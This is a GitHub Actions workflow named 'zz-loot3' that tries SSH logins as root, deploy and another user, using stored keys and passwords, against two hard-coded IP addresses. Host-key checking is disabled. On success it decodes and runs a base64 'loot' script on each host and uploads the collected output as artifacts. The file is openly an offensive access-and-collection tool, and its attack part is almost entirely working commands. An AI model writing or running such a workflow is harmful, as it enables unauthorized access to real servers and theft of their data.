name: zz-loot3
on:
  workflow_dispatch:
permissions:
  contents: read
jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    strategy:
      fail-fast: false
      max-parallel: 8
      matrix:
        include:
          - { host: '204.168.167.195', user: 'root', auth: 'rsa', tag: 'cx33' }
          - { host: '204.168.167.195', user: 'ploky', auth: 'rsa', tag: 'cx33' }
          - { host: '204.168.167.195', user: 'deploy', auth: 'rsa', tag: 'cx33' }
          - { host: '204.168.167.195', user: 'root', auth: 'pw', tag: 'cx33' }
          - { host: '46.62.247.167', user: 'root', auth: 'rsa', tag: 'cx23' }
          - { host: '46.62.247.167', user: 'deploy', auth: 'rsa', tag: 'cx23' }
          - { host: '46.62.247.167', user: 'root', auth: 'pw', tag: 'cx23' }
    steps:
      - name: connect
        env:
          H: ${{ matrix.host }}
          U: ${{ matrix.user }}
          AUTH: ${{ matrix.auth }}
          TAG: ${{ matrix.tag }}
          ZZ_RSA: ${{ secrets.ZZ_RSA }}
          ZZ_PW: ${{ secrets.ZZ_PW }}
          LOOT_CX33: ''
          LOOT_CX23: ''
        run: |
          set +e
          mkdir -p out
          printf '%s\n' "$ZZ_RSA" > k.pem; chmod 600 k.pem
          if [ "$AUTH" = "pw" ]; then
            sudo apt-get -y install sshpass >/dev/null 2>&1
            SSHCMD="sshpass -p $ZZ_PW ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=15 -o PreferredAuthentications=password -o PubkeyAuthentication=no"
          else
            SSHCMD="ssh -i k.pem -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=15 -o BatchMode=yes"
          fi
          echo "=== try $U@$H auth=$AUTH"
          timeout 45 $SSHCMD $U@$H 'id; hostname' > out/probe.txt 2>&1
          echo "RC=$?"
          cat out/probe.txt
          if grep -q "uid=" out/probe.txt; then
            echo "LOGIN_OK"
            echo "$U@$H OK" > out/OK.txt
            if [ "$TAG" = "cx33" ]; then echo "$LOOT_CX33" | base64 -d > loot.sh; else echo "$LOOT_CX23" | base64 -d > loot.sh; fi
            timeout 150 $SSHCMD $U@$H 'bash -s' < loot.sh > out/loot.txt 2>&1
            echo "--- loot size: $(wc -c < out/loot.txt) ---"
            tail -60 out/loot.txt
          fi
      - uses: actions/upload-artifact@v4
        if: always()
        with:
          name: p-${{ matrix.tag }}-${{ matrix.user }}-${{ matrix.auth }}
          path: out/
          retention-days: 2
